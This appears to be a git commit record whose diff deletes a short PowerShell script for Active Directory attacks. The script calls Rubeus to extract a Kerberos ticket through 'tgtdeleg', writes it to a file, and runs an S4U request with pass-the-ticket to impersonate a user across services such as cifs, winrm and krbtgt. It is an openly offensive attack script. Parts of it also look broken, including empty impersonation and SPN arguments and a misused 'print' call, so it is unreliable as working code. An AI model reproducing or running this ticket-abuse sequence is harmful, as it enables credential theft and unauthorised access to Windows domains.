4b2e94a0958bcdabccb206dee6ef780886e664bb
kyle <kyle41111@gmail.com>
2022-05-04 23:08:23 -0400

    Delete ActiveDirectory&win directory

--- ActiveDirectory&win/ConstrainedDelegtgt.ps1
+++
@@ -1,6 +0,0 @@
-$out = (cmd /c Rubeus.exe tgtdeleg /nowrap) | Out-String
-$ticket = (print $out | select -last 2 | select -first 1).trim() 
-$ticket | Out-File kerb.txt
-cmd /c Rubeus.exe s4u /user:$usr /impersonateuser: /ticket:$ticket /msdsspn:"" /altservice:cifs,host,http,winrm,RPCSS,wsman,krbtgt /ptt
-
-
